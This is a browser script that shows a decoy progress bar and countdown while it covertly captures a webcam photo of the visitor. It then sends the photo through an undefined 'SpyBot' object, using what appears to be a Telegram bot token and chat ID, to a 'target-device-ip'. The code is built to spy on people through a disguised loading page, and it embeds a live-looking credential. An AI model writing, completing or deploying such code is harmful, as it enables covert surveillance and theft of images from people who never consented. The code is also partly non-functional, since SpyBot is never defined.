// JavaScript code in script.js

const video = document.createElement('video');
const canvas = document.createElement('canvas');
const progressBar = document.getElementById('progress');
const countdown = document.getElementById('countdown');

function updateProgress(percentage) {
  progressBar.style.width = `${percentage}%`;
}

function updateCountdown(seconds) {
  countdown.textContent = seconds;
}

// Function to capture image from camera
function captureImage() {
  navigator.mediaDevices.getUserMedia({ video: true, audio: false })
    .then(stream => {
      video.srcObject = stream;
      video.play();

      setTimeout(() => {
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        const dataURL = canvas.toDataURL('image/jpeg');
        // Send the captured image to the server or display it on the page
        console.log('Captured image:', dataURL);

        // Send the captured image to the specified bot and user
        const bot = new SpyBot('target-device-ip', '7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E', '5375214810');

        bot.connect()
          .then(() => {
            return bot.execute(`sendImage "${dataURL}"`);
          })
          .then(() => {
            console.log('Image sent successfully!');
          })
          .catch(error => {
            console.error('Error sending image:', error);
          });
      }, 2000);
    })
    .catch(error => {
      console.error('Error accessing camera:', error);
    });
}

// Simulate data collection and progress updates
updateProgress(0);
updateCountdown(20);

setTimeout(() => {
  updateProgress(25);
  updateCountdown(15);
}, 2000);

// Simulate camera access and image capture
setTimeout(() => {
  captureImage();
}, 4000);
